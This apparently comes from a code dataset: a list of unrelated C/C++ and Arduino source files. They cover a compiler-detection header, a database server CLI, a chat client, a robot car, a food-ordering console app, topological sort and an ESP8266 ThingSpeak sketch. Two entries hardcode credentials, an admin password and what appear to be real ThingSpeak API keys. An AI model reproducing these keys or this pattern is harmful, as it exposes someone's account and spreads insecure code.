f[tets[i][2]] += fs[1];\n        f[tets[i][3]] += fs[2];\n    }\n\n    smooth_v();\n\n    for (unsigned int i = 0; i < particleNr; i++)\n    {",
    "/* This source file must have a .cpp extension so that all C++ compilers\n   recognize the extension without flags.  Borland does not know .cxx for\n   example.  */\n#ifndef __cplusplus\n# error \"A C compiler has been selected for C++.\"\n#endif\n\n#if !defined(__has_include)\n/* If the compiler does not have __has_include, pretend the answer is\n   always no.  */\n#  define __has_include(x) 0\n#endif\n\n\n/* Version number components: V=Version, R=Revision, P=Patch\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\n\n#if defined(__COMO__)\n# define COMPILER_ID \"Comeau\"\n  /* __COMO_VERSION__ = VRR */\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\n\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\n# define COMPILER_ID \"Intel\"\n# if defined(_MSC_VER)\n#  define SIMULATE_ID \"MSVC\"\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_ID \"GNU\"\n# endif\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\n     except that a few beta releases use the old format with V=2021.  */\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\n#  if defined(__INTEL_COMPILER_UPDATE)\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\n#  else\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\n#  endif\n# else\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\n   /* The third version component from --version is an update index,\n      but no macro is provided for it.  */\n#  define COMPILER_VERSION_PATCH DEC(0)\n# endif\n# if defined(__INTEL_COMPILER_BUILD_DATE)\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\n# endif\n# if defined(_MSC_VER)\n   /* _MSC_VER = VVRR */\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n# endif\n# if defined(__GNUC__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n# elif defined(__GNUG__)\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n# endif\n# if defined(__GNUC_MINOR__)\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n# endif\n# if defined(__GNUC_PATCHLEVEL__)\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n# endif\n\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\n# define COMPILER_ID \"IntelLLVM\"\n#if defined(_MSC_VER)\n# define SIMULATE_ID \"MSVC\"\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_ID \"GNU\"\n#endif\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\n * VVVV is no smaller than the current year when a version is released.\n */\n#if __INTEL_LLVM_COMPILER < 1000000L\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\n#else\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\n#endif\n#if defined(_MSC_VER)\n  /* _MSC_VER = VVRR */\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\n#endif\n#if defined(__GNUC__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\n#elif defined(__GNUG__)\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\n#endif\n#if defined(__GNUC_MINOR__)\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\n#endif\n#if defined(__GNUC_PATCHLEVEL__)\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\n#endif\n\n#elif defined(__PATHCC__)\n# define COMPILER_ID \"PathScale\"\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\n# if defined(__PATHCC_PATCHLEVEL__)\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\n# endif\n\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\n# define COMPILER_ID \"Embarcadero\"\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\n\n#elif defined(__BORLANDC__)\n# define COMPILER_ID \"Borland\"\n  /* __BORLANDC__ = 0xVRR */\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\n\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\n# define COMPILER_ID \"Watcom\"\n   /* __WATCOMC__ = VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "// Licensed to the Apache Software Foundation (ASF) under one\n// or more contributor license agreements.  See the NOTICE file\n// distributed with this work for additional information\n// regarding copyright ownership.  The ASF licenses this file\n// to you under the Apache License, Version 2.0 (the\n// \"License\"); you may not use this file except in compliance\n// with the License.  You may obtain a copy of the License at\n//\n//   http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing,\n// software distributed under the License is distributed on an\n// \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY\n// KIND, either express or implied.  See the License for the\n// specific language governing permissions and limitations\n// under the License.\n\n#include \"library/include/gizmosql_library.h\"\n#include <iostream>\n#include <boost/program_options.hpp>\n\nnamespace po = boost::program_options;\nnamespace fs = std::filesystem;\n\nint main(int argc, char **argv) {\n  std::vector<std::string> tls_token_values;\n\n  // Declare the supported options.\n  po::options_description desc(\"Allowed options\");\n  // clang-format off\n    desc.add_options()\n            (\"help\", \"produce this help message\")\n            (\"version\", \"Print the version and exit\")\n            (\"backend,B\", po::value<std::string>()->default_value(\"duckdb\"),\n             \"Specify the database backend. Allowed options: duckdb, sqlite.\")\n            (\"hostname,H\", po::value<std::string>()->default_value(\"\"),\n             \"Specify the hostname to listen on for the GizmoSQL Server.  If not set, we will use env var: 'GIZMOSQL_HOSTNAME'.  \"\n             \"If that isn't set, we will use the default of: '0.0.0.0'.\")\n            (\"port,R\", po::value<int>()->default_value(DEFAULT_FLIGHT_PORT),\n             \"Specify the port to listen on for the GizmoSQL Server.\")\n            (\"database-filename,D\", po::value<std::string>()->default_value(\"\"),\n             \"Specify the database filename (absolute or relative to the current working directory)\")\n            (\"username,U\", po::value<std::string>()->default_value(\"\"),\n             \"Specify the username to allow to connect to the GizmoSQL Server for clients.  If not set, we will use env var: 'GIZMOSQL_USERNAME'.  \"\n             \"If that isn't set, we will use the default of: 'gizmosql_username'.\")\n            (\"password,P\", po::value<std::string>()->default_value(\"\"),\n             \"Specify the password to set on the GizmoSQL Server for clients to connect with.  If not set, we will use env var: 'GIZMOSQL_PASSWORD'.  \"\n             \"If that isn't set, the server will exit with failure.\")\n            (\"secret-key,S\", po::value<std::string>()->default_value(\"\"),\n             \"Specify the secret key used to sign JWTs issued by the GizmoSQL Server. \"\n             \"If it isn't set, we use env var: 'SECRET_KEY'.  If that isn't set, the server will create a random secret key.\")\n            (\"tls,T\", po::value<std::vector<std::string>>(&tls_token_values)->multitoken()->default_value(\n                     std::vector<std::string>{\"\", \"\"}, \"\"),\n             \"Specify the TLS certificate and key file paths.\")\n            (\"init-sql-commands,I\", po::value<std::string>()->default_value(\"\"),\n             \"Specify the SQL commands to run on server startup.  \"\n             \"If not set, we will use env var: 'INIT_SQL_COMMANDS'.\")\n            (\"init-sql-commands-file,F\", po::value<std::string>()->default_value(\"\"),\n             \"Specify a file containing SQL commands to run on server startup.  \"\n             \"If not set, we will use env var: 'INIT_SQL_COMMANDS_FILE'.\")\n            (\"mtls-ca-cert-filename,M\", po::value<std::string>()->default_value(\"\"),\n             \"Specify an optional mTLS CA certificate path used to verify clients.  The certificate MUST be in PEM format.\")\n            (\"print-queries,Q\", po::bool_switch()->default_value(false), \"Print queries run by clients to stdout\");\n  // clang-format on\n\n  po::variables_map vm;\n  po::store(po::parse_command_line(argc, argv, desc), vm);\n  po::notify(vm);\n\n  if (vm.count(\"help\")) {\n    std::cout << desc << \"\\n\";\n    return 0;\n  }\n\n  if (vm.count(\"version\")) {\n    std::cout << \"GizmoSQL Server CLI: \" << GIZMOSQL_SERVER_VERSION << std::endl;\n    return 0;\n  }\n\n  std::string backend_str = vm[\"backend\"].as<std::string>();\n  BackendType backend;\n  if (backend_str == \"duckdb\") {\n    backend = BackendType::duckdb;\n  } else if (backend_str == \"sqlite\") {\n    backend = BackendType::sqlite;\n  } else {\n    std::cout << \"Invalid backend: \" << backend_str << std::endl;\n    return 1;\n  }\n\n  auto database_filename = fs::path(vm[\"database-filename\"].as<std::string>());\n\n  std::string hostname = \"\";\n  if (vm.count(\"hostname\")) {\n    hostname = vm[\"hostname\"].as<std::string>();\n  }\n\n  int port = vm[\"port\"].as<int>();\n\n  std::string username = \"\";\n  if (vm.count(\"username\")) {\n    username = vm[\"username\"].as<std::string>();\n  }\n\n  std::string password = \"\";\n  if (vm.c",
    "#include <bits/stdc++.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <errno.h>\n#include <string.h>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <thread>\n#include <signal.h>\n#include <mutex>\n#define MAX_LEN 200\n#define NUM_COLORS 6\n\nusing namespace std;\n\nbool exit_flag=false;\nthread t_send, t_recv;\nint client_socket;\nstring def_col=\"\\033[0m\";\nstring colors[]={\"\\033[31m\", \"\\033[32m\", \"\\033[33m\", \"\\033[34m\", \"\\033[35m\", \"\\033[36m\"};\n\nvoid catch_ctrl_c(int signal);\nstring color(int code);\nint eraseText(int cnt);\nvoid send_message(int client_socket);\nvoid recv_message(int client_socket);\n\nint main()\n{\n\tif((client_socket=socket(AF_INET,SOCK_STREAM,0))==-1)\n\t{\n\t\tperror(\"socket: \");\n\t\texit(-1);\n\t}\n\n\tstruct sockaddr_in client;\n\tclient.sin_family=AF_INET;\n\tclient.sin_port=htons(10000); // Port no. of server\n\tclient.sin_addr.s_addr=INADDR_ANY;\n\t//client.sin_addr.s_addr=inet_addr(\"127.0.0.1\"); // Provide IP address of server\n\tbzero(&client.sin_zero,0);\n\n\tif((connect(client_socket,(struct sockaddr *)&client,sizeof(struct sockaddr_in)))==-1)\n\t{\n\t\tperror(\"connect: \");\n\t\texit(-1);\n\t}\n\tsignal(SIGINT, catch_ctrl_c);\n\tchar name[MAX_LEN];\n\tcout<<\"Enter your name : \";\n\tcin.getline(name,MAX_LEN);\n\tsend(client_socket,name,sizeof(name),0);\n\n\tcout<<colors[NUM_COLORS-1]<<\"\\n\\t  ====== Welcome to the chat-room ======   \"<<endl<<def_col;\n\n\tthread t1(send_message, client_socket);\n\tthread t2(recv_message, client_socket);\n\n\tt_send=move(t1);\n\tt_recv=move(t2);\n\n\tif(t_send.joinable())\n\t\tt_send.join();\n\tif(t_recv.joinable())\n\t\tt_recv.join();\n\t\t\t\n\treturn 0;\n}\n\n// Handler for \"Ctrl + C\"\nvoid catch_ctrl_c(int signal) \n{\n\tchar str[MAX_LEN]=\"#exit\";\n\tsend(client_socket,str,sizeof(str),0);\n\texit_flag=true;\n\tt_send.detach();\n\tt_recv.detach();\n\tclose(client_socket);\n\texit(signal);\n}\n\nstring color(int code)\n{\n\treturn colors[code%NUM_COLORS];\n}\n\n// Erase text from terminal\nint eraseText(int cnt)\n{\n\tchar back_space=8;\n\tfor(int i=0; i<cnt; i++)\n\t{\n\t\tcout<<back_space;\n\t}\t\n}\n\n// Send message to everyone\nvoid send_message(int client_socket)\n{\n\twhile(1)\n\t{\n\t\tcout<<colors[1]<<\"You : \"<<def_col;\n\t\tchar str[MAX_LEN];\n\t\tcin.getline(str,MAX_LEN);\n\t\tsend(client_socket,str,sizeof(str),0);\n\t\tif(strcmp(str,\"#exit\")==0)\n\t\t{\n\t\t\texit_flag=true;\n\t\t\tt_recv.detach();\t\n\t\t\tclose(client_socket);\n\t\t\treturn;\n\t\t}\t\n\t}\t\t\n}\n\n// Receive message\nvoid recv_message(int client_socket)\n{\n\twhile(1)\n\t{\n\t\tif(exit_flag)\n\t\t\treturn;\n\t\tchar name[MAX_LEN], str[MAX_LEN];\n\t\tint color_code;\n\t\tint bytes_received=recv(client_socket,name,sizeof(name),0);\n\t\tif(bytes_received<=0)\n\t\t\tcontinue;\n\t\trecv(client_socket,&color_code,sizeof(color_code),0);\n\t\trecv(client_socket,str,sizeof(str),0);\n\t\teraseText(6);\n\t\tif(strcmp(name,\"#NULL\")!=0)\n\t\t\tcout<<color(color_code)<<name<<\" : \"<<def_col<<str<<endl;\n\t\telse\n\t\t\tcout<<color(color_code)<<str<<endl;\n\t\tcout<<colors[1]<<\"You : \"<<def_col;\n\t\tfflush(stdout);\n\t}\t\n}\n",
    "\r\n//Servo\r\n#include <Servo.h>\r\nServo myservo;\r\nint pos = 90;  \r\nint echoPin=13;\r\nint trigPin=12; \r\nlong duration; \r\nint distance; \r\n//bluetooth\r\nword Incoming_value = 0; \r\n// Motors \r\nint right_motor_1 = 5;\r\nint right_motor_2 = 4;\r\nint left_motor_1 = 6;\r\nint left_motor_2 = 7;\r\nint enable_left = 3;\r\nint enable_right = 9;\r\n// Line Sensors\r\nint ls_R = 0;\r\nint ls_C = 1;\r\nint ls_L = 2;\r\n\r\n//\r\n\r\nvoid setup() \r\n{\r\n  Serial.begin(9600);        \r\n  pinMode(right_motor_1, OUTPUT);\r\n  pinMode(right_motor_2, OUTPUT);\r\n  pinMode(left_motor_1, OUTPUT);\r\n  pinMode(left_motor_2, OUTPUT);\r\n  pinMode(enable_left,OUTPUT);\r\n  pinMode(enable_right,OUTPUT);\r\n  pinMode(echoPin,INPUT);\r\n  pinMode(trigPin, OUTPUT);\r\n  \r\n  \r\n}\r\n\r\n\r\nvoid loop()\r\n{\r\n  //Ultrasonic\r\n  digitalWrite(trigPin, LOW);\r\n  delayMicroseconds(2);\r\n  digitalWrite(trigPin, HIGH);\r\n  delayMicroseconds(10);\r\n  digitalWrite(trigPin, LOW);\r\n  duration = pulseIn(echoPin, HIGH);\r\n  distance = duration * 0.034 / 2; \r\n    //Serial.println(distance);\r\n  //  Serial.println(Incoming_value);\r\n\r\n   if (distance<50){\r\n     Incoming_value = Serial.read();\r\n          \r\n    if(Incoming_value == 'b'){\r\n     delay(500);\r\n     backward();\r\n    }\r\n    else if(Incoming_value == 'r'){\r\n      right();      \r\n    }\r\n    else if(Incoming_value == 'l'){\r\n     left();\r\n    }\r\n    else {\r\n     hold();\r\n    }\r\n    \r\n        \r\n      } \r\n  else {\r\n//  if(Serial.available() > 0)  \r\n//  { \r\n    Incoming_value = Serial.read(); \r\n       \r\n//    Serial.print(Incoming_value);        \r\n//    Serial.print(\"\\n\"); \r\n    \r\n    if(Incoming_value == 'b'){\r\n     backward();\r\n    }\r\n      \r\n    else if(Incoming_value == 'f'){\r\n      \r\n        \r\n      forward();\r\n    }\r\n    else if(Incoming_value == 'r'){\r\n      right();      \r\n    }\r\n    else if(Incoming_value == 'l'){\r\n     left();\r\n    }\r\n    else if(Incoming_value == 'h'){\r\n     hold();\r\n    }\r\n      \r\n                              \r\n \r\n//  }\r\n  } }   \r\nvoid backward(){\r\n   analogWrite(enable_left,120);\r\n      analogWrite(enable_right,120);\r\n      digitalWrite(right_motor_1, LOW);\r\n      digitalWrite(right_motor_2, HIGH);\r\n      digitalWrite(left_motor_1, LOW);\r\n      digitalWrite(left_motor_2, HIGH);\r\n  }\r\nvoid forward(){\r\n      analogWrite(enable_left,120);\r\n      analogWrite(enable_right,120);\r\n      digitalWrite(right_motor_1, HIGH);\r\n      digitalWrite(left_motor_1, HIGH);\r\n      digitalWrite(right_motor_2, LOW);\r\n      digitalWrite(left_motor_2, LOW);\r\n  }\r\nvoid hold(){\r\n      analogWrite(enable_left,0);\r\n      analogWrite(enable_right,0);\r\n      digitalWrite(right_motor_1, LOW);\r\n      digitalWrite(left_motor_1, LOW);\r\n      digitalWrite(right_motor_2, LOW);\r\n      digitalWrite(left_motor_2, LOW);\r\n  }  \r\nvoid right(){\r\n      analogWrite(enable_left,100);\r\n      analogWrite(enable_right,100);\r\n      digitalWrite(right_motor_1, HIGH);\r\n      digitalWrite(right_motor_2, LOW);\r\n      digitalWrite(left_motor_1, LOW);\r\n      digitalWrite(left_motor_2, HIGH);\r\n      delay(680);\r\n      Incoming_value ='F';\r\n      forward();\r\n      \r\n   \r\n      \r\n  } \r\nvoid left(){\r\n      analogWrite(enable_left,100);\r\n      analogWrite(enable_right,100);\r\n      digitalWrite(right_motor_1, LOW);\r\n      digitalWrite(right_motor_2, HIGH);\r\n      digitalWrite(left_motor_1, HIGH);\r\n      digitalWrite(left_motor_2, LOW);\r\n      delay(680);\r\n      Incoming_value = 'F';\r\n      forward();\r\n      \r\n  \r\n  }\r\n\r\n          \r\n",
    "\n#include<stdio.h>\n#include<stdlib.h>\n#include<conio.h>\n#include<string.h>\n#include<windows.h>\n#include<time.h>\n\n\n///Logic Functions\n\n   /// Update & Insert Function\nvoid insertfirst(int data, char foodname[25], int quantity, float price);\nvoid insertmid(int pos, int data, char foodname[25], int quantity, float price);\nvoid insertend(int data, char foodname[25], int quantity, float price);\nvoid updatefood(int udata, int uquantity);\n\n     /// Display Function\nvoid foodlist();\nvoid order_view(int order, int quantity, int or_no);\nvoid main_menu();\n\n    ///Delete & Count Function\nvoid deletefood(int serial);\nint countitem();\n\n\n\n\n///extra design Function\n\nvoid cls();\nvoid echo(char print[]);\nvoid br(int line);\nvoid pre(int tab);\nvoid span(int space);\nvoid ccolor(int clr);\nvoid pwellcome();\nvoid loadingbar();\nvoid middle1(void);\nvoid middtab1(void);\nvoid backuploader(void);\n\n\n        ///START Structure Here\n\nstruct Node{\n\n\tchar foodname[50];\n\tint quantity;\n\tfloat price;\n\tint data;\n\tstruct Node *next;\n\n};\n\n   ///Global Type\n\ntypedef struct Node node ;\n\nnode *head, *list;\n\nint main(){\n\n\tsystem(\"title ..................TEAM Xcros Over PROJECT PRESENTANTION.......................\");\n\tsystem(\"mode con: cols=80 lines=30\");\n\n\n\tloadingbar(); cls();\n\tpwellcome();\n\tSleep(300);\n\tcls();\n\n\tint c=0; int any;\n\tint cardno[100];\n\tfloat cardmoney[100];\n\tfloat totalmoney = 0;\n\tint total_order[100];\n\tint order_quantity[100];\n\tint order=0;\n\tint uquantity;\n\tint citem;\n\n\thead = NULL;\n\tinsertfirst(5,\"Burger   \",23,120.23);\n\tinsertend(6,\"Pizza    \",13,100.67);\n\tinsertend(1,\"Hot Cake \",8,720.83);\n\tinsertend(2,\"Coffie   \",46,70.23);\n\tinsertend(3,\"Ice-Cream\",46,70.23);\n\tinsertend(4,\"Sandwich \",34,60.23);\n\tinsertend(7,\"Grill    \",7,520.29);\n\tinsertend(8,\"Nun-Bread\",121,35.13);\n\tinsertend(9,\"Cold Drinks\",73,20.13);\n\n\n\n\tmainmenu:\n\tbr(1);\n\n\tmain_menu();\n\n\tint main_menu_choice;\n\n\tbr(1); pre(4); fflush(stdin); scanf(\"%d\",&main_menu_choice);\n\n\tif((main_menu_choice >=1 && main_menu_choice <=3)){\n\n\t\tif(main_menu_choice == 1){\n\n\t\t\tfoodlist:\n\n\t\t\tcls();\n\t\t\tprintf(\"=> 0. Main Menu \");\n\t\t\tfoodlist();\n\n\n\t\t}\n\n\t\telse if( main_menu_choice == 2){\n\n\t\t\tadminpanelchoice:\n\n\t\t\tint admin_panel_choice;\n\n\t\t\tcls(); middle1() ;   pre(4);  printf(\"1. Main Menu\\n\\n\\t\"); Sleep(300);\n\t\t\tprintf(\"Please Enter Password or ( 1 to Back in Main Menu ) : \");\n\n\n\t\t\tfflush(stdin);  scanf(\"%d\",&admin_panel_choice);\n\n\t\t\tif(admin_panel_choice==123321){\n\n\n\n\t\t\t\tnode *temp;\n\n\t\t\t\ttemp = list;\n\n\t\t\t\tadminchoise:\n\n\t\t\t\tcls();  br(5); pre(4); echo(\"You are on Admin Pannel\\n\\n\");\n\t\t\t\tpre(4);\n\t\t\t\tprintf(\" 1. Total Cash Today \\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 2. View Card Pay \\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 3. Add Food \\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 4. Delete Food \\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 5. Instant Food List \\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 6. Item Counter \\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 7. Backup System\\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 8. Instant Order Preview\\n\\n\");Sleep(250);pre(4);\n\t\t\t\tprintf(\" 0. Main Menu \\n\\n\");\r\n\t\t\t\tprintf(\"Enter Your From 1-0: \");\r\n\t\t\t\tSleep(250);\n\n\t\t\t\tint adminchoise;\n\n\n\n\t\t\t\tfflush(stdin);   scanf(\"%d\",&adminchoise);\n\n\t\t\t\tif(adminchoise==1){\n\n\t\t\t\t\tcls();  middle1(); pre(4);   printf(\"Todays Total Cash : %0.2f  \\n\",totalmoney);\n\n\t\t\t\t\tSleep(2000);\n\n\t\t\t\t\tgoto adminchoise;\n\t\t\t\t}\n\t\t\t\telse if(adminchoise==2){\n\n\t\t\t\t\tif(c!=0){\n\n\t\t\t\t\t\tcls();  br(3); pre(4);\n\n\t\t\t\t\t\tprintf(\" ____________________________\\n\");pre(4);\n\t\t\t\t\t\tprintf(\"|   Card NO.   |   Money $   |\\n\");pre(4);\n\t\t\t\t\t\tprintf(\"------------------------------\\n\");pre(4);\n\n\t\t\t\t\t\tfor(int z=1; z<=c;z++){\n\n\t\t\t\t\t\t\tprintf(\"|  %d  | %0.2f |\\n\",cardno[z],cardmoney[z]);pre(4);\n\t\t\t\t\t\t\tprintf(\"------------------------------\\n\");pre(4);\n\t\t\t\t\t\t\tSleep(150);\n\n\t\t\t\t\t\t}\n\t\t\t\t\t\tSleep(1500);\n\t\t\t\t\t}\n\n\t\t\t\t\tif(c==0){\n\n\t\t\t\t\t\tcls();  middle1(); pre(4);\n\t\t\t\t\tprintf(\"No Card History\\n\");}\n\t\t\t\t\tSleep(1500);\n\t\t\t\t\tgoto adminchoise;\n\t\t\t\t}\n\n\t\t\t\telse if(adminchoise==3){\n\n\t\t\t\t\tfoodadd:\n\t\t\t\t\tcls();\n\n\t\t\t\t\tchar ffoodname[25];\n\t\t\t\t\tint fquantity;\n\t\t\t\t\tint fdata;\n\t\t\t\t\tfloat fprice;\n\t\t\t\t\tint fposi;\n\n\n\t\t\t\t\tbr(3);pre(4);      printf(\" Enter Food Name :  \");\n\n\t\t\t\t\tfflush(stdin);     scanf(\"%[^\\n]s\",ffoodname);\n\t\t\t\t\tfquantity:\n\t\t\t\t\tfflush(stdin);\n\n\t\t\t\t\tbr(2);pre(4);\r\n\t\t\t\t\tprintf(\" Enter Food Quantity :  \");\n\n\t\t\t\t\tscanf(\"%d\",&fquantity); fflush(stdin);\n\n                        foodserial:\n\t\t\t\t\tbr(2);pre(4);  printf(\" Enter Food Serial :  \");\n                      scanf(\"%d\",&fdata);\n                            node *exist;\n                            exist = list;\n                      while(exist->data!=fdata){\n                            if(exist->next==NULL){\n                                break;\n                            }\n                        exist=exist->next;\n                      }\n                      if(exist->data==fdata){\n                       cls(); br(5);pre(3);  printf(\" Food Serial Already Exist, Please Re-Enter  \"); Sleep(2000);\n                       goto foodserial;\n                      }\n\n ",
    "#include<bits/stdc++.h>\r\nusing namespace std;\r\nvector<int>v[10000],res;\r\nint mp[10000];\r\nvoid bfs(int n)\r\n{\r\n    queue<int>q;\r\n    for(int i=1;i<=n;i++)\r\n    {\r\n        if(mp[i]==0)q.push(i);\r\n    }\r\n    while(!q.empty())\r\n    {\r\n        int cur=q.front();\r\n        q.pop();\r\n        res.push_back(cur);\r\n        for(auto child:v[cur])\r\n        {\r\n            mp[child]--;\r\n            if(mp[child]==0)q.push(child);\r\n        }\r\n    }\r\n    cout<<\"Topological Sort : \";\r\n    for(auto x:res)cout<<x<<\" \";\r\n    cout<<endl;\r\n}\r\nint main()\r\n{\r\n    int n,e;\r\n    cin>>n>>e;\r\n    while(e--)\r\n    {\r\n        int x,y;\r\n        cin>>x>>y;\r\n        v[x].push_back(y);\r\n        mp[y]++;\r\n    }\r\n    bfs(n);\r\n}\r\n/*\r\n\r\n5 4\r\n\r\n1 2\r\n2 3\r\n1 3\r\n1 5\r\nTopological Sort : 1 4 2 5 3\r\n*/\r\n/*\r\n///If topological sort Exits or not\r\n\r\n#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n    int n,m;\r\n    cin>>n>>m;\r\n    vector<int>v[n+1],mp(n+5,0),res;\r\n    for(int i=1; i<=m; i++)\r\n    {\r\n        int x,y;\r\n        cin>>x>>y;\r\n        v[x].push_back(y);\r\n        mp[y]++;\r\n    }\r\n    //sort()\r\n    priority_queue<int,vector<int>,greater<int>>q;\r\n    for(int i=1; i<=n; i++)\r\n    {\r\n        if(mp[i]==0)q.push(i);\r\n    }\r\n    while(!q.empty())\r\n    {\r\n        int cur=q.top();\r\n        q.pop();\r\n        res.push_back(cur);\r\n        for(auto x:v[cur])\r\n        {\r\n            mp[x]--;\r\n            if(mp[x]==0)q.push(x);\r\n        }\r\n    }\r\n    if(res.size()==n)\r\n    {\r\n        //cout<<\"YES\"<<endl;\r\n    for(int i=0; i<n; i++)\r\n        cout<<res[i]<<\" \";\r\n    cout<<endl;\r\n    }\r\n    else cout<<\"Sandro fails.\"<<endl;\r\n}\r\n\r\n\r\n*/\r\n",
    "#include \"ThingSpeak.h\" // Include the ThingSpeak library for communication with the ThingSpeak cloud service\n#include \"ESP8266WiFi.h\"\n\nWiFiClient client; // Create a WiFi client object, which will be used for the ThingSpeak connection\n\n// Define ThingSpeak channel and API keys\nunsigned long myChannelNumber = 2384399; // Your ThingSpeak channel number where data will be written/read\nconst char *myWriteAPIKey = \"ELW2NF5Q83OGB39G\"; // API key for writing data to the ThingSpeak channel\nconst char *myCounterReadAPIKey = \"3D8NH4JCI0EDYMIU\"; // API key for reading data from the ThingSpeak channel\n\nvoid setup() {\n  // After connecting to WiFi, initialize the ThingSpeak communication\n  // ThingSpeak requires an active WiFi connection, which is managed by the WiFiClient object\n  ThingSpeak.begin(client); // Start ThingSpeak communication using the WiFi client\n}\n\nvoid loop() {\n  // Reading data from specific fields on the ThingSpeak channel\n  // These fields store data that has been previously uploaded to ThingSpeak\n\n  // Read a long integer value from field 5 of the specified ThingSpeak channel\n  int A = ThingSpeak.readLongField(myChannelNumber, 5, myCounterReadAPIKey);\n  // After reading the value, the analog output on pin 5 is set based on the data retrieved from ThingSpeak\n  analogWrite(5, A); // Set pin 5 analog value to the retrieved data (A)\n\n  // Read a long integer value from field 6 of the specified ThingSpeak channel\n  int B = ThingSpeak.readLongField(myChannelNumber, 6, myCounterReadAPIKey);\n  // Set the analog output on pin 4 based on the data retrieved from ThingSpeak\n  analogWrite(4, B); // Set pin 4 analog value to the retrieved data (B)\n\n  // Read a long integer value from field 7 of the specified ThingSpeak channel\n  int C = ThingSpeak.readLongField(myChannelNumber, 7, myCounterReadAPIKey);\n  // Set the analog output on pin 0 based on the data retrieved from ThingSpeak\n  analogWrite(0, C); // Set pin 0 analog value to the retrieved data (C)\n\n  // Read a long integer value from field 8 of the specified ThingSpeak channel\n  int D = ThingSpeak.readLongField(myChannelNumber, 8, myCounterReadAPIKey);\n\n  // Conditional behavior based on the value read from field 8\n  if (D == 100) {\n    // If the value from field 8 is 100, blink the D7 pin's connected actuator (e.g., an LED)\n    digitalWrite(D7, HIGH); // Turn on pin D7\n    delay(500);             // Wait for 500 milliseconds\n    digitalWrite(D7, LOW);  // Turn off pin D7\n    delay(500);             // Repeat the blinking pattern\n    digitalWrite(D7, HIGH);\n    delay(500);\n    digitalWrite(D7, LOW);\n    delay(500);\n    digitalWrite(D7, HIGH);\n    delay(500);\n    digitalWrite(D7, LOW);\n\n    // Update field 8 on ThingSpeak with a 